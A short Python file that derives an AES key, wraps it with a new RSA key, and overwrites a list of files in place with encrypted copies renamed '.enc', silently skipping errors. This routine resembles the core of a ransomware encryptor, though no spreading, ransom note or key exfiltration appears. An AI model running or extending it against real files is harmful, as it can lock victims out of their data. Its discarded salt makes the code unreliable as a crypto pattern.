from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
import os

def create_key(password):
    """
    Generate an AES key from a password using PBKDF2.

    Args:
        password (str): The password to derive the key from.

    Returns:
        bytes: The generated AES key.
    """
    salt = get_random_bytes(32)
    key = PBKDF2(password, salt, dkLen=32)
    return key

def encrypt_key(key):
    """
    Encrypt an AES key using RSA.

    Args:
        key (bytes): The AES key to encrypt.

    Returns:
        tuple: The encrypted AES key and the RSA private key.
    """
    key_pair = RSA.generate(2048)
    pubkey = key_pair.public_key()
    privkey = key_pair.export_key()
    encryptor_key = PKCS1_OAEP.new(pubkey)
    encrypt_key = encryptor_key.encrypt(key)
    return encrypt_key, privkey

def write_key(key, privkey):
    """
    Write the encrypted AES key and the RSA private key to files.

    Args:
        key (bytes): The encrypted AES key.
        privkey (bytes): The RSA private key.
    """
    with open('thekey.key', 'wb') as thekey:
        thekey.write(key)
    with open('privkey.key', 'wb') as thekey:
        thekey.write(privkey)

def encrypt_data(files, cipher):
    """
    Encrypt the contents of a list of files using AES.

    Args:
        files (list): List of file paths to encrypt.
        cipher (AES): The AES cipher object.
    """
    for file in files:
        try:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
            contents_encrypted = cipher.encrypt(pad(contents, AES.block_size))
            with open(file, "wb") as the_file:
                the_file.write(cipher.iv)
                the_file.write(contents_encrypted)
            new_file_path = str(file) + '.enc'
            os.rename(file, new_file_path)
        except Exception:
            continue
